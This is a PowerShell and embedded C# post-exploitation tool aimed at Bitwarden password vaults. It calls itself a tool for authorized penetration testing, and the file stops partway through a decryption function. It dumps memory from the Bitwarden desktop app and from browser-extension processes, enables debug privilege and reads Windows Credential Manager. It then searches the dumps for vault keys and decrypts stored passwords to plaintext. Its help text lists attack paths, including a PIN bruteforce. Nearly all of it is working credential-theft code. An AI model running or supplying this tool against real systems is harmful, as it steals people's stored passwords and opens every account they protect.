<#
.SYNOPSIS
    Bitwarden Post-Exploitation Tool for authorized penetration testing.
.DESCRIPTION
    Extracts Bitwarden vault credentials via recon, memory dump, and offline decryption.
    Pure PowerShell + .NET P/Invoke. No external dependencies.
#>
[CmdletBinding(DefaultParameterSetName = 'Help')]
param(
    [Parameter(ParameterSetName = 'Recon')][switch]$Recon,
    [Parameter(ParameterSetName = 'Dump')][switch]$Dump,
    [Parameter(ParameterSetName = 'Offline')][switch]$Offline,
    [Parameter(ParameterSetName = 'Parse')][string]$ParseDump,
    [Parameter(ParameterSetName = 'All')][switch]$All,
    [int]$TargetPid = 0,
    [string]$ApiUrl = "https://vault.bitwarden.com",
    [switch]$SaveDump,
    [string]$OutputFile = "credentials.json",
    [Alias('h')][switch]$Help
)

# ============================================================================
#  P/Invoke + C# Interop
# ============================================================================

$csharpCode = @'
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace BW {

    // --- Credential Manager ---
    [StructLayout(LayoutKind.Sequential)]
    public struct CREDENTIAL {
        public uint Flags;
        public uint Type;
        public IntPtr TargetName;
        public IntPtr Comment;
        public long LastWritten;
        public uint CredentialBlobSize;
        public IntPtr CredentialBlob;
        public uint Persist;
        public uint AttributeCount;
        public IntPtr Attributes;
        public IntPtr TargetAlias;
        public IntPtr UserName;
    }

    public class CredInfo {
        public string TargetName;
        public string UserName;
        public uint Type;
        public byte[] Blob;
        public string BlobAsUtf16;
        public string BlobAsUtf8;
    }

    public static class CredMgr {
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CredEnumerate(string filter, int flags, out int count, out IntPtr creds);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CredRead(string target, uint type, int flags, out IntPtr cred);

        [DllImport("advapi32.dll")]
        static extern void CredFree(IntPtr buf);

        static CredInfo ParseCred(IntPtr ptr) {
            CREDENTIAL c = (CREDENTIAL)Marshal.PtrToStructure(ptr, typeof(CREDENTIAL));
            var info = new CredInfo();
            info.TargetName = c.TargetName != IntPtr.Zero ? Marshal.PtrToStringUni(c.TargetName) : "";
            info.UserName = c.UserName != IntPtr.Zero ? Marshal.PtrToStringUni(c.UserName) : "";
            info.Type = c.Type;
            if (c.CredentialBlobSize > 0 && c.CredentialBlob != IntPtr.Zero) {
                info.Blob = new byte[c.CredentialBlobSize];
                Marshal.Copy(c.CredentialBlob, info.Blob, 0, (int)c.CredentialBlobSize);
                try { info.BlobAsUtf16 = Encoding.Unicode.GetString(info.Blob); } catch {}
                try { info.BlobAsUtf8 = Encoding.UTF8.GetString(info.Blob); } catch {}
            }
            return info;
        }

        public static List<CredInfo> Enumerate(string filter) {
            var list = new List<CredInfo>();
            IntPtr pCreds; int count;
            if (!CredEnumerate(filter, 0, out count, out pCreds)) return list;
            try {
                for (int i = 0; i < count; i++) {
                    IntPtr p = Marshal.ReadIntPtr(pCreds, i * IntPtr.Size);
                    list.Add(ParseCred(p));
                }
            } finally { CredFree(pCreds); }
            return list;
        }

        public static CredInfo Read(string target, uint type) {
            IntPtr pCred;
            if (!CredRead(target, type, 0, out pCred)) return null;
            try { return ParseCred(pCred); }
            finally { CredFree(pCred); }
        }
    }

    // --- Process Memory ---
    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public long Luid;
        public uint Attributes;
    }

    public static class Mem {
        const int PROCESS_VM_READ = 0x0010;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const uint MEM_COMMIT = 0x1000;
        const uint PAGE_GUARD = 0x100;
        const uint PAGE_NOACCESS = 0x01;
        const uint SE_PRIVILEGE_ENABLED = 0x00000002;
        const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        const uint TOKEN_QUERY = 0x0008;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(int access, bool inherit, int pid);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, int size, out int read);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int VirtualQueryEx(IntPtr h, IntPtr addr, out MEMORY_BASIC_INFORMATION info, int len);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr h);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr ph, uint access, out IntPtr th);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AdjustTokenPrivileges(IntPtr th, bool disableAll, ref TOKEN_PRIVILEGES tp, int bufLen, IntPtr prev, IntPtr retLen);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool LookupPrivilegeValue(string host, string name, out long luid);

        public static bool EnableDebugPrivilege() {
            IntPtr token;
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out token)) return false;
            long luid;
            if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid)) { CloseHandle(token); return false; }
            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            tp.PrivilegeCount = 1;
            tp.Luid = luid;
            tp.Attributes = SE_PRIVILEGE_ENABLED;
            bool ok = AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            CloseHandle(token);
            return ok && Marshal.GetLastWin32Error() == 0;
        }

        public static IntPtr Open(int pid) {
            return OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
        }

        public static void Close(IntPtr h) { if (h != IntPtr.Zero) CloseHandle(h); }

        public static List<long[]> GetRegions(IntPtr h) {
            var regions = new List<long[]>();
            long addr = 0;
            int mbiSize = Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION));
            MEMORY_BASIC_INFORMATION mbi;
            while (VirtualQueryEx(h, (IntPtr)addr, out mbi, mbiSize) != 0) {
                long size = mbi.RegionSize.ToInt64();
                if (mbi.State == MEM_COMMIT && mbi.Protect != PAGE_NOACCESS && (mbi.Protect & PAGE_GUARD) == 0) {
                    if (size > 0 && size <= 100 * 1024 * 1024) {
                        regions.Add(new long[] { mbi.BaseAddress.ToInt64(), size });
                    }
                }
                long next = mbi.BaseAddress.ToInt64() + size;
                if (next <= addr) break;
                addr = next;
            }
            return regions;
        }

        public static byte[] ReadRegion(IntPtr h, long baseAddr, int size) {
            byte[] buf = new byte[size];
            int read;
            if (ReadProcessMemory(h, (IntPtr)baseAddr, buf, size, out read)) {
                if (read < size) Array.Resize(ref buf, read);
                return buf;
            }
            return null;
        }
    }
}
'@

$dumpCryptoCode = @'
using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.Security.Cryptography;

namespace BW {

    public class EncStringParsed {
        public byte[] IV;
        public byte[] Data;
        public byte[] MAC;
        public string Raw;
    }

    public class DecryptedEntry {
        public string EncString;
        public string Plaintext;
        public bool IsPerItemKey;
        public string KeySource;
    }

    public class FoundKey {
        public byte[] EncKey;
        public byte[] MacKey;
        public long EncKeyOffset;
        public long MacKeyOffset;
        public int MatchedEncStrings;
    }

    public static class DumpCrypto {

        public static EncStringParsed ParseEnc(string enc) {
            if (enc == null || !enc.StartsWith("2.")) return null;
            string[] parts = enc.Substring(2).Split('|');
            if (parts.Length != 3) return null;
            try {
                var p = new EncStringParsed();
                p.IV = Convert.FromBase64String(parts[0]);
                p.Data = Convert.FromBase64String(parts[1]);
                p.MAC = Convert.FromBase64String(parts[2]);
                p.Raw = enc;
                if (p.IV.Length != 16 || p.MAC.Length != 32) return null;
                return p;
            } catch { return null; }
        }

        public static List<string> ExtractEncStrings(string dumpPath) {
            var result = new HashSet<string>();
            var regex = new Regex(@"2\.[A-Za-z0-9+/=]{16,}\|[A-Za-z0-9+/=]{16,}\|[A-Za-z0-9+/=]{43,44}",
                RegexOptions.Compiled);
            using (var fs = File.OpenRead(dumpPath)) {
                byte[] buf = new byte[10 * 1024 * 1024 + 4096];
                long pos = 0;
                while (pos < fs.Length) {
                    fs.Position = pos;
                    int read = fs.Read(buf, 0, buf.Length);
                    if (read < 100) break;
                    string text = Encoding.ASCII.GetString(buf, 0, read);
                    foreach (Match m in regex.Matches(text)) {
                        if (ParseEnc(m.Value) != null) result.Add(m.Value);
                    }
                    pos += 10 * 1024 * 1024;
                }
            }
            return new List<string>(result);
        }

        static bool MacEquals(byte[] a, byte[] b) {
            if (a.Length != b.Length) return false;
            for (int i = 0; i < a.Length; i++) { if (a[i] != b[i]) return false; }
            return true;
        }

        static byte[] ComputeMacInput(EncStringParsed p) {
            byte[] input = new byte[p.IV.Length + p.Data.Length];
            Buffer.BlockCopy(p.IV, 0, input, 0, p.IV.Length);
            Buffer.BlockCopy(p.Data, 0, input, p.IV.Length, p.Data.Length);
            return input;
        }

        static bool TestMacKey(byte[] key, byte[] macInput, byte[] expectedMac) {
            using (var hmac = new HMACSHA256(key)) {
                byte[] computed = hmac.ComputeHash(macInput);
                return MacEquals(computed, expectedMac);
            }
        }

        // Phase 1: Find macKey - fast path using V8 ArrayBuffer length prefix
        // The key is stored as: [20 00 00 00] [32 bytes key data]
        // Then fallback to full byte scan
        public static FoundKey FindKeys(string dumpPath, List<string> encStrings, Action<string> log) {
            // Prepare samples: pick up to 10 EncStrings with different MACs
            var samples = new List<EncStringParsed>();
            var seenMacs = new HashSet<string>();
            foreach (string enc in encStrings) {
                var p = ParseEnc(enc);
                if (p == null) continue;
                string macB64 = Convert.ToBase64String(p.MAC);
                if (seenMacs.Contains(macB64)) continue;
                seenMacs.Add(macB64);
                samples.Add(p);
                if (samples.Count >= 10) break;
            }
            if (samples.Count == 0) { log("[-] No valid EncStrings found"); return null; }
            log("[*] Prepared " + samples.Count + " sample EncStrings for key search");

            // Pre-compute MAC inputs
            byte[][] macInputs = new byte[samples.Count][];
            for (int i = 0; i < samples.Count; i++) {
                macInputs[i] = ComputeMacInput(samples[i]);
            }

            // === FAST PATH: search for V8 ArrayBuffer prefix [20 00 00 00] ===
            log("[*] Fast path: scanning for V8 ArrayBuffer key patterns...");
            byte[] prefix = new byte[] { 0x20, 0x00, 0x00, 0x00 };
            long macKeyOffset = -1;
            byte[] confirmedMacKey = null;
            int fastCandidates = 0;

            using (var fs = File.OpenRead(dumpPath)) {
                byte[] buf = new byte[10 * 1024 * 1024 + 36];
                long pos = 0;
                while (pos < fs.Length) {
                    fs.Position = pos;
                    int read = fs.Read(buf, 0, buf.Length);
                    if (read < 36) break;

                    for (int i = 0; i <= read - 36; i++) {
                        if (buf[i] != 0x20 || buf[i+1] != 0x00 || buf[i+2] != 0x00 || buf[i+3] != 0x00) continue;
                        fastCandidates++;

                        byte[] candidateKey = new byte[32];
                        Buffer.BlockCopy(buf, i + 4, candidateKey, 0, 32);

                        // Test against all samples
                        int matches = 0;
                        for (int s = 0; s < samples.Count; s++) {
                            if (TestMacKey(candidateKey, macInputs[s], samples[s].MAC)) matches++;
                        }
                        if (matches >= 2 || (matches >= 1 && samples.Count == 1)) {
                            confirmedMacKey = candidateKey;
                            macKeyOffset = pos + i + 4;
                            log("[+] macKey FOUND (fast) at offset " + macKeyOffset + " (" + matches + "/" + samples.Count + " matches)");
                            break;
                        }
                    }
                    if (confirmedMacKey != null) break;
                    pos += 10 * 1024 * 1024;
                }
            }
            log("[*] Fast path tested " + fastCandidates + " candidates");

            // === SLOW PATH if fast failed: full byte scan ===
            if (confirmedMacKey == null) {
                log("[*] Slow path: full byte-by-byte HMAC scan...");
                using (var fs = File.OpenRead(dumpPath)) {
                    byte[] buf = new byte[10 * 1024 * 1024 + 32];
                    long pos = 0;
                    long tested = 0;
                    while (pos < fs.Length) {
                        fs.Position = pos;
                        int read = fs.Read(buf, 0, buf.Length);
                        if (read < 32) break;

                        for (int i = 0; i <= read - 32; i++) {
                            byte[] candidateKey = new byte[32];
                            Buffer.BlockCopy(buf, i, candidateKey, 0, 32);

                            if (TestMacKey(candidateKey, macInputs[0], samples[0].MAC)) {
                                int matches = 1;
                                for (int s = 1; s < samples.Count; s++) {
                                    if (TestMacKey(candidateKey, macInputs[s], samples[s].MAC)) matches++;
                                }
                                if (matches >= 2 || (matches >= 1 && samples.Count == 1)) {
                                    confirmedMacKey = candidateKey;
                                    macKeyOffset = pos + i;
                                    log("[+] macKey FOUND (slow) at offset " + macKeyOffset + " (" + matches + "/" + samples.Count + " matches)");
                                    break;
                                }
                            }
                            tested++;
                            if (tested % 10000000 == 0)
                                log("[*] macKey scan: " + (tested/1000000) + "M offsets (" + (pos*100/fs.Length) + "%)");
                        }
                        if (confirmedMacKey != null) break;
                        pos += 10 * 1024 * 1024;
                    }
                }
            }

            if (confirmedMacKey == null) { log("[-] macKey not found"); return null; }

            // === Find encKey: collect EncStrings that match this macKey ===
            var matchingEncs = new List<EncStringParsed>();
            foreach (string enc in encStrings) {
                var p = ParseEnc(enc);
                if (p == null) continue;
                if (TestMacKey(confirmedMacKey, ComputeMacInput(p), p.MAC)) {
                    matchingEncs.Add(p);
                    if (matchingEncs.Count >= 5) break;
                }
            }
            log("[*] " + matchingEncs.Count + " EncStrings match the macKey, searching encKey...");

            // === FAST PATH 1: search near macKey (±8KB) for encKey ===
            byte[] confirmedEncKey = null;
            long encKeyOffset = -1;

            long searchStart = Math.Max(0, macKeyOffset - 8192);
            long searchLen = 16384 + 32;
            log("[*] Fast encKey search: ±8KB around macKey...");

            using (var fs = File.OpenRead(dumpPath)) {
                fs.Position = searchStart;
                byte[] localBuf = new byte[(int)Math.Min(searchLen, fs.Length - searchStart)];
                int read = fs.Read(localBuf, 0, localBuf.Length);

                for (int i = 0; i <= read - 32; i++) {
                    byte[] candidateEnc = new byte[32];
                    Buffer.BlockCopy(localBuf, i, candidateEnc, 0, 32);
                    if (!ValidateEncKey(candidateEnc, matchingEncs)) continue;
                    confirmedEncKey = candidateEnc;
                    encKeyOffset = searchStart + i;
                    log("[+] encKey FOUND (fast-local) at offset " + encKeyOffset);
                    break;
                }
            }

            // === FAST PATH 2: V8 prefix scan of entire dump for encKey ===
            if (confirmedEncKey == null) {
                log("[*] V8 prefix encKey scan: full dump...");
                using (var fs = File.OpenRead(dumpPath)) {
                    byte[] buf = new byte[10 * 1024 * 1024 + 36];
                    long pos = 0;
                    while (pos < fs.Length) {
                        fs.Position = pos;
                        int read = fs.Read(buf, 0, buf.Length);
                        if (read < 36) break;

                        for (int i = 0; i <= read - 36; i++) {
                            if (buf[i] != 0x20 || buf[i+1] != 0x00 || buf[i+2] != 0x00 || buf[i+3] != 0x00) continue;
                            byte[] candidateEnc = new byte[32];
                            Buffer.BlockCopy(buf, i + 4, candidateEnc, 0, 32);
                            if (MacEquals(candidateEnc, confirmedMacKey)) continue;
                            if (!ValidateEncKey(candidateEnc, matchingEncs)) continue;
                            confirmedEncKey = candidateEnc;
                            encKeyOffset = pos + i + 4;
                            log("[+] encKey FOUND (V8 prefix) at offset " + encKeyOffset);
                            break;
                        }
                        if (confirmedEncKey != null) break;
                        pos += 10 * 1024 * 1024;
                    }
                }
            }

            // === SLOW PATH: byte-by-byte with staged validation ===
            if (confirmedEncKey == null) {
                log("[*] Slow encKey search: byte-by-byte...");
                var firstEnc = matchingEncs[0];
                using (var fs = File.OpenRead(dumpPath)) {
                    byte[] buf = new byte[10 * 1024 * 1024 + 32];
                    long pos = 0;
                    long tested = 0;
                    while (pos < fs.Length) {
                        fs.Position = pos;
                        int read = fs.Read(buf, 0, buf.Length);
                        if (read < 32) break;

                        for (int i = 0; i <= read - 32; i++) {
                            byte[] candidateEnc = new byte[32];
                            Buffer.BlockCopy(buf, i, candidateEnc, 0, 32);
                            byte[] r1 = TryAesDecrypt(candidateEnc, firstEnc.IV, firstEnc.Data);
                            if (r1 == null) continue;
                            if (!ValidateEncKey(candidateEnc, matchingEncs)) continue;
                            confirmedEncKey = candidateEnc;
                            encKeyOffset = pos + i;
                            log("[+] encKey FOUND (slow) at offset " + encKeyOffset);
                            break;
                        }
                        if (confirmedEncKey != null) break;
                        pos += 10 * 1024 * 1024;
                        tested += 10 * 1024 * 1024;
                        if (tested % (100 * 1024 * 1024) == 0)
                            log("[*] encKey scan: " + (tested/(1024*1024)) + "MB (" + (pos*100/fs.Length) + "%)");
                    }
                }
            }

            if (confirmedEncKey == null) { log("[-] encKey not found"); return null; }

            // Count total matching EncStrings
            int totalMatch = 0;
            foreach (string enc in encStrings) {
                var p = ParseEnc(enc);
                if (p != null && TestMacKey(confirmedMacKey, ComputeMacInput(p), p.MAC)) totalMatch++;
            }

            return new FoundKey {
                EncKey = confirmedEncKey,
                MacKey = confirmedMacKey,
                EncKeyOffset = encKeyOffset,
                MacKeyOffset = macKeyOffset,
                MatchedEncStrings = totalMatch
            };
        }

        static byte[] TryAesDecrypt(byte[] key, byte[] iv, byte[] data) {
            try {
                using (var aes = Aes.Create()) {
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    using (var dec = aes.CreateDecryptor()) {
                        return dec.TransformFinalBlock(data, 0, data.Length);
                    }
                }
            } catch { return null; }
        }

        public static List<DecryptedEntry> DecryptAll(List<string> encStrings, byte[] encKey, byte[] macKey,
            string keyLabel, Action<string> log) {
            var results = new List<DecryptedEntry>();
            var perItemKeys = new List<Tuple<byte[], byte[], int>>();
            var undecrypted = new List<string>();
            int piIdx = 0;

            // Phase 1: direct decryption with provided key
            foreach (string enc in encStrings) {
                var p = ParseEnc(enc);
                if (p == null) { undecrypted.Add(enc); continue; }
                if (!TestMacKey(macKey, ComputeMacInput(p), p.MAC)) { undecrypted.Add(enc); continue; }
                byte[] plain = TryAesDecrypt(encKey, p.IV, p.Data);
                if (plain == null) { undecrypted.Add(enc); continue; }

                bool isPIK = (plain.Length == 64);
                if (isPIK) {
                    byte[] piEnc = new byte[32]; byte[] piMac = new byte[32];
                    Buffer.BlockCopy(plain, 0, piEnc, 0, 32);
                    Buffer.BlockCopy(plain, 32, piMac, 0, 32);
                    perItemKeys.Add(Tuple.Create(piEnc, piMac, piIdx++));
                }
                results.Add(new DecryptedEntry {
                    EncString = enc,
                    Plaintext = isPIK ? "[PER-ITEM-KEY#" + (piIdx-1) + "]" : SafeString(plain),
                    IsPerItemKey = isPIK,
                    KeySource = keyLabel
                });
            }
            log("[+] Phase 1 (" + keyLabel + "): " + results.Count + " decrypted, " +
                perItemKeys.Count + " per-item keys, " + undecrypted.Count + " remaining");

            // Phase 2: per-item key cascade
            if (perItemKeys.Count > 0 && undecrypted.Count > 0) {
                var stillUndecrypted = new List<string>();
                foreach (string enc in undecrypted) {
                    var p = ParseEnc(enc);
                    if (p == null) { stillUndecrypted.Add(enc); continue; }
                    bool found = false;
                    foreach (var pik in perItemKeys) {
                        if (!TestMacKey(pik.Item2, ComputeMacInput(p), p.MAC)) continue;
                        byte[] plain = TryAesDecrypt(pik.Item1, p.IV, p.Data);
                        if (plain == null) continue;
                        results.Add(new DecryptedEntry {
                            EncString = enc,
                            Plaintext = SafeString(plain),
                            IsPerItemKey = false,
                            KeySource = keyLabel + ":PIK#" + pik.Item3
                        });
                        found = true;
                        break;
                    }
                    if (!found) stillUndecrypted.Add(enc);
                }
                log("[+] Phase 2 (per-item keys): +" + (undecrypted.Count - stillUndecrypted.Count) +
                    " decrypted, " + stillUndecrypted.Count + " still encrypted");
                undecrypted = stillUndecrypted;
            }

            return results;
        }

        // Try to find additional keys for remaining EncStrings (e.g., userKey after orgKey)
        public static FoundKey FindAdditionalKey(string dumpPath, List<string> remaining,
            byte[] excludeMacKey, Action<string> log) {
            if (remaining.Count < 2) return null;
            log("[*] Searching for additional key (" + remaining.Count + " remaining EncStrings)...");

            var samples = new List<EncStringParsed>();
            var seenMacs = new HashSet<string>();
            foreach (string enc in remaining) {
                var p = ParseEnc(enc);
                if (p == null) continue;
                string macB64 = Convert.ToBase64String(p.MAC);
                if (seenMacs.Contains(macB64)) continue;
                seenMacs.Add(macB64);
                samples.Add(p);
                if (samples.Count >= 10) break;
            }
            if (samples.Count == 0) return null;

            byte[][] macInputs = new byte[samples.Count][];
            for (int i = 0; i < samples.Count; i++) macInputs[i] = ComputeMacInput(samples[i]);

            // Fast path
            byte[] prefix = new byte[] { 0x20, 0x00, 0x00, 0x00 };
            using (var fs = File.OpenRead(dumpPath)) {
                byte[] buf = new byte[10 * 1024 * 1024 + 36];
                long pos = 0;
                while (pos < fs.Length) {
                    fs.Position = pos;
                    int read = fs.Read(buf, 0, buf.Length);
                    if (read < 36) break;

                    for (int i = 0; i <= read - 36; i++) {
                        if (buf[i] != 0x20 || buf[i+1] != 0x00 || buf[i+2] != 0x00 || buf[i+3] != 0x00) continue;
                        byte[] ck = new byte[32];
                        Buffer.BlockCopy(buf, i + 4, ck, 0, 32);
                        if (excludeMacKey != null && MacEquals(ck, excludeMacKey)) continue;

                        int matches = 0;
                        for (int s = 0; s < samples.Count; s++) {
                            if (TestMacKey(ck, macInputs[s], samples[s].MAC)) matches++;
                        }
                        if (matches >= 2 || (matches >= 1 && samples.Count == 1)) {
                            long macOff = pos + i + 4;
                            log("[+] Additional macKey at offset " + macOff + " (" + matches + " matches)");
                            // Find encKey nearby
                            var matchEncs = new List<EncStringParsed>();
                            foreach (string enc in remaining) {
                                var p = ParseEnc(enc);
                                if (p == null) continue;
                                if (TestMacKey(ck, ComputeMacInput(p), p.MAC)) {
                                    matchEncs.Add(p);
                                    if (matchEncs.Count >= 3) break;
                                }
                            }
                            if (matchEncs.Count == 0) continue;

                            long ss = Math.Max(0, macOff - 8192);
                            fs.Position = ss;
                            byte[] lb = new byte[(int)Math.Min(16416, fs.Length - ss)];
                            int r2 = fs.Read(lb, 0, lb.Length);
                            for (int j = 0; j <= r2 - 32; j++) {
                                byte[] ce = new byte[32];
                                Buffer.BlockCopy(lb, j, ce, 0, 32);
                                if (!ValidateEncKey(ce, matchEncs)) continue;
                                int total = 0;
                                foreach (string enc in remaining) {
                                    var p = ParseEnc(enc);
                                    if (p != null && TestMacKey(ck, ComputeMacInput(p), p.MAC)) total++;
                                }
                                return new FoundKey { EncKey = ce, MacKey = ck, EncKeyOffset = ss + j,
                                    MacKeyOffset = macOff, MatchedEncStrings = total };
                            }
                        }
                    }
                    pos += 10 * 1024 * 1024;
                }
            }
            return null;
        }

        static bool ValidateEncKey(byte[] candidate, List<EncStringParsed> matchingEncs) {
            // Entropy check: real AES-256 key must have high entropy
            var distinct = new HashSet<byte>();
            foreach (byte b in candidate) distinct.Add(b);
            if (distinct.Count < 12) return false;
            // ALL matching EncStrings must decrypt with valid PKCS7
            foreach (var enc in matchingEncs) {
                byte[] result = TryAesDecrypt(candidate, enc.IV, enc.Data);
                if (result == null) return false;
            }
            return true;
        }

        static string SafeString(byte[] data) {
            try {
                string s = Encoding.UTF8.GetString(data);
                var sb = new StringBuilder();
                foreach (char c in s) {
                    if (c >= 32 && c < 127) sb.Append(c);
                    else if (c == '\n' || c == '\r' || c == '\t') sb.Append(' ');
                    else sb.Append('.');
                }
                return sb.ToString().Trim();
            } catch { return "[binary:" + data.Length + "b]"; }
        }

        // Get remaining undecrypted EncStrings
        public static List<string> GetRemaining(List<string> all, List<DecryptedEntry> decrypted) {
            var decSet = new HashSet<string>();
            foreach (var d in decrypted) decSet.Add(d.EncString);
            var remaining = new List<string>();
            foreach (string enc in all) {
                if (!decSet.Contains(enc)) remaining.Add(enc);
            }
            return remaining;
        }
    }
}
'@

try {
    Add-Type -TypeDefinition $csharpCode -ErrorAction Stop
} catch {
    if ($_.Exception.Message -notlike '*already exists*' -and
        $_.Exception.InnerException -and
        $_.Exception.InnerException.Message -notlike '*already exists*') {
        throw
    }
}

try {
    Add-Type -TypeDefinition $dumpCryptoCode -ErrorAction Stop
} catch {
    if ($_.Exception.Message -notlike '*already exists*' -and
        $_.Exception.InnerException -and
        $_.Exception.InnerException.Message -notlike '*already exists*') {
        throw
    }
}

# ============================================================================
#  Helper Functions
# ============================================================================

function Show-Banner {
    $banner = @"

  ____  _ _ __        __            _
 | __ )(_) |\ \      / /_ _ _ __ __| | ___ _ __
 |  _ \| | __\ \ /\ / / _` | '__/ _` |/ _ \ '_ \
 | |_) | | |_ \ V  V / (_| | | | (_| |  __/ | | |
 |____/|_|\__| \_/\_/ \__,_|_|  \__,_|\___|_| |_|
                                    Vault Dumper

  Bitwarden Post-Exploitation Tool - For authorized pentesting only
"@
    Write-Host $banner -ForegroundColor Cyan
}

function Show-Help {
    $helpText = @"

  MODES:
    -Recon              Enumerate Bitwarden presence (desktop + browser extensions),
                        Credential Manager, data.json config, recommend attack path
    -Dump               Dump memory from Bitwarden desktop AND browser extension
                        processes (Chrome, Brave, Edge, Firefox, Vivaldi)
    -Offline            Full offline vault decryption via Credential Manager + data.json
    -ParseDump <file>   Parse an existing memory dump file
    -All                Run recon, then execute best available attack automatically

  OPTIONS:
    -TargetPid <int>    Target a specific PID (with -Dump, skips auto-discovery)
    -ApiUrl <url>       Bitwarden/Vaultwarden API URL (with -Offline, default: vault.bitwarden.com)
    -SaveDump           Save raw memory dump to disk (with -Dump)
    -OutputFile <file>  Output file for results (default: credentials.json)
    -Verbose            Show detailed debug output
    -Help               Show this help message

  EXAMPLES:
    .\Invoke-BitwardenDump.ps1 -Recon
    .\Invoke-BitwardenDump.ps1 -Dump
    .\Invoke-BitwardenDump.ps1 -Dump -SaveDump
    .\Invoke-BitwardenDump.ps1 -Dump -TargetPid 4812
    .\Invoke-BitwardenDump.ps1 -Offline -ApiUrl https://vaultwarden.corp.local
    .\Invoke-BitwardenDump.ps1 -ParseDump .\bitwarden.dmp
    .\Invoke-BitwardenDump.ps1 -All

  PRIVILEGES:
    Same user as Bitwarden  -> No special privs needed
    Different user           -> Requires Admin/SYSTEM (SeDebugPrivilege)

  ATTACK PATHS:
    1. Timeout=Never or old Windows Hello -> -Offline (best: silent, offline, complete)
    2. Vault unlocked (desktop or browser)-> -Dump (desktop app + browser extensions)
    3. PIN unlock enabled                 -> -Offline + PIN bruteforce
"@
    Write-Host $helpText -ForegroundColor Gray
}

function Write-Status {
    param([string]$Message, [string]$Type = "info")
    switch ($Type) {
        "good"    { Write-Host "  [+] " -NoNewline -ForegroundColor Green;  Write-Host $Message }
        "bad"     { Write-Host "  [-] " -NoNewline -ForegroundColor Red;    Write-Host $Message }
        "warn"    { Write-Host "  [*] " -NoNewline -ForegroundColor Yellow; Write-Host $Message }
        "info"    { Write-Host "  [i] " -NoNewline -ForegroundColor Cyan;   Write-Host $Message }
        "header"  { Write-Host "`n  === $Message ===" -ForegroundColor Magenta }
    }
}

function Get-ProcessOwner {
    param([int]$ProcessId)
    try {
        $wmi = Get-CimInstance Win32_Process -Filter "ProcessId = $ProcessId" -ErrorAction Stop
        $owner = Invoke-CimMethod -InputObject $wmi -MethodName GetOwner -ErrorAction Stop
        if ($owner.Domain -and $owner.User) { return "$($owner.Domain)\$($owner.User)" }
        return $owner.User
    } catch { return "UNKNOWN" }
}

# ============================================================================
#  Crypto Functions (Bitwarden AES-256-CBC + HMAC-SHA256)
# ============================================================================

function Split-EncString {
    param([string]$EncString)
    if ([string]::IsNullOrEmpty($EncString)) { return $null }
    $dotIdx = $EncString.IndexOf('.')
    if ($dotIdx -lt 0) { return $null }
    $encType = [int]$EncString.Substring(0, $dotIdx)
    $data = $EncString.Substring($dotIdx + 1)
    $parts = $data.Split('|')
    switch ($encType) {
        0 { return @{ Type = 0; Data = $parts[0] } }
        2 {
            if ($parts.Count -ge 3) {
                return @{ Type = 2; IV = $parts[0]; CT = $parts[1]; MAC = $parts[2] }
            } elseif ($parts.Count -eq 2) {
                return @{ Type = 2; IV = $parts[0]; CT = $parts[1]; MAC = $null }
            }
        }
        4 { return @{ Type = 4; CT = $parts[0] } }
        6 {
            if ($parts.Count -ge 2) {
                return @{ Type = 6; CT = $parts[0]; MAC = $parts[1] }
            }
        }
    }
    return $null
}

function Decrypt-AesCbc256 {
    param(
        [byte[]]$EncKey,
        [byte[]]$MacKey,
        [byte[]]$IV,
        [byte[]]$CT,
        [byte[]]$MAC
    )
    if ($MacKey -and $MAC) {
        $hmac = New-Object System.Security.Cryptography.HMACSHA256
        $hmac.Key = $MacKey
        $data = New-Object byte[] ($IV.Length + $CT.Length)
        [Array]::Copy($IV, 0, $data, 0, $IV.Length)
        [Array]::Copy($CT, 0, $data, $IV.Length, $CT.Length)
        $computed = $hmac.ComputeHash($data)
        $hmac.Dispose()
        $match = $true
        for ($i = 0; $i -lt [Math]::Min($computed.Length, $MAC.Length); $i++) {
            if ($computed[$i] -ne $MAC[$i]) { $match = $false; break }
        }
        if (-not $match) {
            Write-Verbose "HMAC verification failed"
            return $null
        }
    }
    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.KeySize = 256
        $aes.Key = $EncKey
        $aes.IV = $IV
        $dec = $aes.CreateDecryptor()
        $result = $dec.TransformFinalBlock($CT, 0, $CT.Length)
        $dec.Dispose()
        $aes.Dispose()
        return $result
    } catch {
        Write-Verbose "AES decryption failed: $_"
        return $null
    }
}

function Decrypt-EncString {
    param(
        [string]$EncString,
        [byte[]]$EncKey,
        [byte[]]$MacKey
    )
    $parsed = Split-EncString $EncString
    if (-not $parsed) { return $null }
